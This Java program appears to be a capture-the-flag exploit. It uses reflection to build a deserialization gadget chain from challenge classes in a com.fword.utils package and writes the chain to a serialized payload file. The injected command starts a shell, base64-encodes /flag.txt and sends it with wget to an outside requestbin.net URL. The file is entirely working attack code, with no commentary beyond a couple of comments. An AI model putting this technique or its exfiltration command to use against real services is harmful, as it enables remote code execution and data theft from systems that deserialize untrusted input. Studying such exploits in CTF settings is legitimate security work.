import java.io.* ;
import java.util.* ;
import java.lang.reflect.*;
import com.fword.utils.* ;

class Main
{
    public static void main(String[] args) {
        try {
            com.fword.utils.Question questObject = new com.fword.utils.Question();

            Constructor<?> constructor = com.fword.utils.UtilityEval.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            com.fword.utils.UtilityEval Eval = (com.fword.utils.UtilityEval) constructor.newInstance();

            com.fword.utils.Truncate Trun = new com.fword.utils.Truncate();
            com.fword.utils.Feedback Feed = new com.fword.utils.Feedback();

            Field privateValue = com.fword.utils.Truncate.class.getDeclaredField("value");
            privateValue.setAccessible(true);
            // get a shell environment as $() is not executed in Runtime.exec
            privateValue.set(Trun, new String("sh -c $@|sh . echo wget http://requestbin.net/r/h1j2dzzb?a=$(cat /flag.txt|base64|tr -d \"\n\")"));

            Field privatef1 = com.fword.utils.Feedback.class.getDeclaredField("f1");
            privatef1.setAccessible(true);
            privatef1.set(Feed, Eval);

            Field privatef2 = com.fword.utils.Feedback.class.getDeclaredField("f2");
            privatef2.setAccessible(true);
            privatef2.set(Feed, Trun);


            Field privateCategory = com.fword.utils.Question.class.getDeclaredField("category");
            privateCategory.setAccessible(true);

            privateCategory.set(questObject, Feed);

            com.fword.utils.UserComparator userComp = new com.fword.utils.UserComparator();
            Field privateQuest = com.fword.utils.UserComparator.class.getDeclaredField("questionObj");
            privateQuest.setAccessible(true);
            privateQuest.set(userComp, questObject);
            PriorityQueue<com.fword.utils.User> pq = new PriorityQueue<com.fword.utils.User>(5,userComp);
            com.fword.utils.User userObj = new com.fword.utils.User("aa");
            pq.add(userObj);
            pq.add(userObj);

            System.out.println("Object built successfully!");

            // serialized payload object
            String filename = "serialized.obj";
            // saving the serialized object in a file
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);

            // method for serialization of object
            out.writeObject(pq);

            out.close();
            file.close();

            System.out.println("Object has been serialized");

        }

        catch (IOException ex) {
            StringWriter writer = new StringWriter();
            PrintWriter printWriter = new PrintWriter( writer );
            ex.printStackTrace( printWriter );
            printWriter.flush();

            String stackTrace = writer.toString();

            System.out.println("IOException is caught "+stackTrace);
        }

        catch (NoSuchFieldException ex) {
            System.out.println("NoSuchFieldException is caught");

        }

        catch (IllegalAccessException ex) {
            System.out.println("IllegalAccessException is caught");

        }

        catch (NoSuchMethodException ex) {
            System.out.println("NoSuchMethodException exception");
        }

        catch (InstantiationException ex) {
            System.out.println("InstantiationException exception");
        }

        catch (InvocationTargetException ex) {
            System.out.println("InvocationTargetException exception");
        }
    }
}
